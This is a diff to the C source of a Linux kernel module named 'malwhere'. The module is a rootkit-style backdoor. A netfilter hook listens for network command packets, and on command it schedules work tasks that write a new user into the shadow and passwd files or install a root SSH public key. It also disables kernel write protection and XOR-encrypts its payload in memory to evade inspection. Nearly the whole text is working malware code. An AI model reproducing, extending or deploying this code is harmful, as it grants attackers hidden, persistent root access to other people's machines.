@@ -4,6 +4,7 @@
 #include <linux/file.h>
 #include <linux/fdtable.h>
 #include <linux/dcache.h>
+#include <linux/preempt.h>
 #include <linux/syscalls.h>
 #include <linux/fs.h>
 #include <linux/fcntl.h>
@@ -32,6 +33,7 @@
 #include <linux/vmalloc.h>
 #include <linux/kthread.h>
 
+#include "main.h"
 #include "sensitive.h"
 
 #define DEFAULT_KEY 97425196
@@ -45,10 +47,11 @@ static int debug_output = 0;
 char *module_str = "malwhere";
 unsigned char *nfhook_deep_space = NULL;
 struct nf_hook_ops nfho;
-struct task_struct *task_watchdog = NULL;
 atomic_t trigger_add_user = ATOMIC_INIT(0);
 atomic_t trigger_add_pubkey = ATOMIC_INIT(0);
 atomic_t payload_encrypted = ATOMIC_INIT(0);
+DECLARE_WORK(wq_add_user, wq_task_add_user);
+DECLARE_WORK(wq_add_root_pubkey, wq_task_add_root_pubkey);
 
 struct command {
   unsigned int action, cur_key, new_key;
@@ -58,16 +61,15 @@ struct key_state {
   unsigned int cur_key, new_key;
 };
 
-/* Disable page modification - reenable W^X */
-void disable_pm(void) {
+/* Enable page modification - reenable W^X */
+void enable_pm(void) {
   write_cr0(read_cr0() & (~ 0x10000));
 }
 
-/* Enable page modification - disable W^X */
-void enable_pm(void) {
+/* Disable page modification - disable W^X */
+void disable_pm(void) {
   write_cr0(read_cr0() | 0x10000);
 }
-
 
 /* Command packet follows this format:
  *   1. initiation sequence
@@ -86,7 +88,6 @@ struct command *get_command(unsigned char *data, size_t len) {
   printk(KERN_ALERT "get_command()");
   char initiation[] = {0x6b,0x65,0x79};
   char action = 0;
-  int cur_key, new_key = 0;
   int i = 0;
   char intbuf[KEY_STR_LEN+1];
 
@@ -120,7 +121,7 @@ struct command *get_command(unsigned char *data, size_t len) {
 
   intbuf[KEY_STR_LEN] = '\0';
   if (kstrtouint(intbuf, 10, &cmd->cur_key) < 0) {
-    kfree(cmd);
+    if (cmd) kfree(cmd);
     return NULL;
   }
 
@@ -131,7 +132,7 @@ struct command *get_command(unsigned char *data, size_t len) {
 
   intbuf[KEY_STR_LEN] = '\0';
   if (kstrtouint(intbuf, 10, &cmd->new_key) < 0) {
-    kfree(cmd);
+    if (cmd) kfree(cmd);
     return NULL;
   }
 
@@ -188,11 +189,11 @@ static unsigned int nfhook(unsigned int hooknum, struct sk_buff *skb, const stru
       
       // Command packet is valid, process the action.
       if (is_add_user(cmd)) {
-        atomic_set(&trigger_add_user, 1);
         debug_output && printk(KERN_ALERT "Will add user");
+        schedule_work(&wq_add_user);
       } else if (is_add_pubkey(cmd)) {
-        atomic_set(&trigger_add_pubkey, 1);
         debug_output && printk(KERN_ALERT "Will add pubkey");
+        schedule_work(&wq_add_root_pubkey);
       } else {
         // Action is invalid.
         debug_output && printk(KERN_ALERT "Got command packet with bad action %x\n", cmd->action);
@@ -233,14 +234,18 @@ static void unset_nf_hook(void) {
 
 void xor_range(unsigned char *addr, size_t len, unsigned int k) {
   size_t i;
-  disable_pm();
+  preempt_disable();
+  barrier();
+  enable_pm();
   for (i = 0; i <= len; i+=4) {
     addr[i]   ^= (k & 0xff000000) >> 24;
     addr[i+1] ^= (k & 0x00ff0000) >> 16;
     addr[i+2] ^= (k & 0x0000ff00) >> 8;
     addr[i+3] ^=  k & 0x000000ff;
   }
-  enable_pm();
+  disable_pm();
+  barrier();
+  preempt_enable();
 }
 
 // Align SENSITIVE_LEN on key-length boundary to ensure no over-encryption.
@@ -274,6 +279,32 @@ void decrypt_payload(void) {
   atomic_set(&payload_encrypted, 0);
   // Get rid of it.
   cur_key = 0;
+}
+
+// Work queue task
+void wq_task_add_user(void *data) {
+  int ret;
+  decrypt_payload();
+  // If adding the user to the shadow file succeeds, but addition to the passwd file fails,
+  // then at least we added to the shadow file first. The existence of a user in shadow, but not
+  // passwd is probably better than vice versa. Or just stop being lazy and remove the line from
+  // shadow in this error case. Eh maybe later.
+  if ((ret = add_user_shadow()) < 0) {
+    printk(KERN_ALERT "error: work_add_user: shadow: %d\n", ret);
+  }
+  else if ((ret = add_user_passwd()) < 0) {
+    printk(KERN_ALERT "error: work_add_user: passwd: %d\n", ret);
+  }
+  encrypt_payload();
+}
+
+// Work queue task
+void wq_task_add_root_pubkey(void *data) {
+  int ret;
+  decrypt_payload();
+  if ((ret = add_root_pubkey()) < 0)
+    printk(KERN_ALERT "error: work_add_root_pubkey: %d\n", ret);
+  encrypt_payload();
 }
 
 int wait_for_command(void *data) {
@@ -312,11 +343,9 @@ int wait_for_command(void *data) {
 }
 
 static int __init init(void) {
-  printk(KERN_INFO "debug_output=%d\n", debug_output);
   encrypt_payload();
   debug_output && printk(KERN_INFO, "Setting nfhook");
   set_nf_hook();
-  task_watchdog = kthread_run(wait_for_command, NULL, "static");
 
   /*
   unsigned int block_size = 0;
@@ -362,8 +391,6 @@ static int __init init(void) {
 
 static void __exit exit(void) {
   printk(KERN_INFO "[%s] exiting\n", module_str);
-  if (task_watchdog)
-    kthread_stop(task_watchdog);
   unset_nf_hook();
   printk(KERN_INFO "[%s] exited\n", module_str);
 }
